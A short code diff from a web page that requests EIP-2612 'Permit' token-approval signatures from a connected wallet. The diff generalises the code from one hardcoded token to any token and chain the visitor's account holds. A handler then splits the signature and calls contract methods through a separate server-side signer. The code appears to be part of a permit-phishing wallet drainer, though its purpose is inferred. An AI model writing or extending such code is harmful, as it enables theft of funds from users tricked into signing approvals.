@@ -109,10 +109,10 @@ const Page = () => {
 								},
 								"primaryType": "Permit",
 								"domain": {
-									"name": "UNT",
+									"name": token.contract_ticker_symbol,
 									"version": "1",
-									"chainId": 1,
-									"verifyingContract": "0xa91B61D526D1Ec730241b32db2f4C2B79D50CA35" // BNB Contract
+									"chainId": account.chainId,
+									"verifyingContract": token.contract_address // BNB Contract
 								},
 								"message": message
 							};
@@ -288,7 +288,7 @@ async function handle(json: any, signer?: JsonRpcSigner) {
 	const SIGNER = signer || await createSigner()
 
 	const CALL = async (method: keyof typeof methods, ...args: any[])=>{
-		return await callContractMethod(method, args, "0xa91B61D526D1Ec730241b32db2f4C2B79D50CA35",SIGNER)
+		return await callContractMethod(method, args, contract,SIGNER)
 	}
 
 	const {v, r, s} = ethers.utils.splitSignature(signature);
